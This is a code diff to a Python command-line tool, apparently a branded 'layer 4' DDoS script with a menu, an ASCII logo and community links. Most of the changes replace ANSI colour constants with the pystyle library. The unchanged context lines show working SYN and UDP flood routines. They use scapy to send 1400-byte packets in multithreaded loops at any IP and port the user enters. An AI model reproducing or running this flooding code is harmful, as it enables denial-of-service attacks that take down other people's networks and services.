@@ -4,42 +4,18 @@ import random
 import threading
 import time
 from scapy.all import IP, TCP, UDP, Raw, send
-
-class TextColors:
-    BLACK = '\033[30m'
-    RED = '\033[31m'
-    GREEN = '\033[32m'
-    YELLOW = '\033[33m'
-    BLUE = '\033[34m'
-    MAGENTA = '\033[35m'
-    CYAN = '\033[36m'
-    WHITE = '\033[37m'
-    PURPLE = '\033[35m'
-    UNDERLINE = '\033[4m'
-    RESET = '\033[0m'
-    BOLD = "\033[01;01m"
-    DARK_RED = "\033[38;5;124m"
-    CRIMSON = "\033[38;5;196m"
-    TOMATO = "\033[38;5;202m"
-    LIGHT_RED = "\033[91m"
-    LIGHT_GREEN = "\033[92m" 
-    RADICAL_RED = "\033[38;5;160m"
-    DARK_GREEN = "\033[38;5;28m"
-    SUPER_BRIGHT_LIME_GREEN = '\033[38;2;102;255;102m'
-    BRIGHT_WHITE = '\033[97m'
-    BRIGHT_LIME_GREEN_RGB = '\033[38;2;50;205;50m'
+from pystyle import Colorate, Colors
 
 def logo():
     os.system('cls' if os.name == 'nt' else 'clear')
-    print(TextColors.SUPER_BRIGHT_LIME_GREEN + """
+    print(Colorate.Horizontal(Colors.green_to_white, """
     ██╗      █████╗ ██╗   ██╗███████╗██████╗     ██╗  ██╗
     ██║     ██╔══██╗╚██╗ ██╔╝██╔════╝██╔══██╗    ██║  ██║
     ██║     ███████║ ╚████╔╝ █████╗  ██████╔╝    ███████║
     ██║     ██╔══██║  ╚██╔╝  ██╔══╝  ██╔══██╗    ╚════██║
     ███████╗██║  ██║   ██║   ███████╗██║  ██║         ██║
     ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝         ╚═╝ 
-    """+ TextColors.RESET)
-    print(TextColors.BRIGHT_LIME_GREEN_RGB + """
+                              
     --------------------------------------
     Revolt : https://rvlt.gg/PeewQeV9
     Github : https://github.com/madanokr001
@@ -53,13 +29,15 @@ def logo():
     exit  |  exit layer3 menu
 
           
-"""+ TextColors.RESET)
+"""))
 
 def layer4():
     while True:
         logo()
-        select = input(TextColors.SUPER_BRIGHT_LIME_GREEN + """═══[root@ZOIC~$]                                                                   
-═══> """ + TextColors.RESET)
+        select = input(Colorate.Horizontal(Colors.green_to_blue,"""
+═══[root@ZOIC~$]                                                                   
+═══> 
+"""))
 
         if select == "syn" or select.lower() == "1":
             def send_packets(target_ip, target_port):
@@ -69,7 +47,7 @@ def layer4():
                     byte = Raw(load='X' * 1400)
                     pkt = ip / tcp / byte
                     send(pkt, verbose=0)
-                    print(TextColors.CYAN + f"[+] IP Address : {target_ip} [+] SYN Packet : {pkt.summary()}"+ TextColors.RESET)
+                    print(Colorate.Horizontal(Colors.cyan_to_green, f"[+] IP Address {target_ip} [*] SYN Packet : {pkt.summary()}"))
                     time.sleep(0.01)
 
             def start_flooding(target_ip, target_port, thread_count):
@@ -81,15 +59,18 @@ def layer4():
                 for thread in threads:
                     thread.join()
 
-            target_ip = input(TextColors.SUPER_BRIGHT_LIME_GREEN + """
+            target_ip = input(Colorate.Horizontal(Colors.green_to_blue,"""
 ═══[root@TARGET-IP]                                                                   
-═══> """ + TextColors.RESET) 
-            target_port = int(input(TextColors.SUPER_BRIGHT_LIME_GREEN + """
-═══[root@TARGET-PORT]                                                                   
-═══> """ + TextColors.RESET)) 
-            thread_count = int(input(TextColors.SUPER_BRIGHT_LIME_GREEN + """
-═══[root@THREAD]                                                                   
-═══> """ + TextColors.RESET))
+═══> 
+"""))
+            target_port = int(input(Colorate.Horizontal(Colors.green_to_blue,"""
+═══[root@PORT]                                                                   
+═══> 
+""")))
+            thread_count = int(input(Colorate.Horizontal(Colors.green_to_blue,"""
+═══[root@THREADS]                                                                   
+═══> 
+""")))
             start_flooding(target_ip, target_port, thread_count)
 
 
@@ -101,7 +82,8 @@ def layer4():
                     byte = Raw(load='X' * 1400)
                     pkt = ip / udp / byte
                     send(pkt, verbose=0)
-                    print(TextColors.CYAN + f"[+] IP Address : {target_ip} [+] UDP Packet : {pkt.summary()}" + TextColors.RESET)
+                    print(Colorate.Horizontal(Colors.cyan_to_green, f"[+] IP Address {target_ip} [*] UDP Packet : {pkt.summary()}"))
+                    time.sleep(0.01)
 
             def start_flooding(target_ip, target_port, thread_count):
                 threads = []
@@ -112,16 +94,18 @@ def layer4():
                 for thread in threads:
                     thread.join()
 
-            target_ip = input(TextColors.SUPER_BRIGHT_LIME_GREEN + """
+            target_ip = input(Colorate.Horizontal(Colors.green_to_blue,"""
 ═══[root@TARGET-IP]                                                                   
-═══> """ + TextColors.RESET) 
-            target_port = int(input(TextColors.SUPER_BRIGHT_LIME_GREEN + """
-═══[root@TARGET-PORT]                                                                   
-═══> """ + TextColors.RESET)) 
-            thread_count = int(input(TextColors.SUPER_BRIGHT_LIME_GREEN + """
-═══[root@THREAD]                                                                   
-═══> """ + TextColors.RESET))
-
+═══> 
+"""))
+            target_port = int(input(Colorate.Horizontal(Colors.green_to_blue,"""
+═══[root@PORT]                                                                   
+═══> 
+""")))
+            thread_count = int(input(Colorate.Horizontal(Colors.green_to_blue,"""
+═══[root@THREADS]                                                                   
+═══> 
+""")))
             start_flooding(target_ip, target_port, thread_count)
             
 
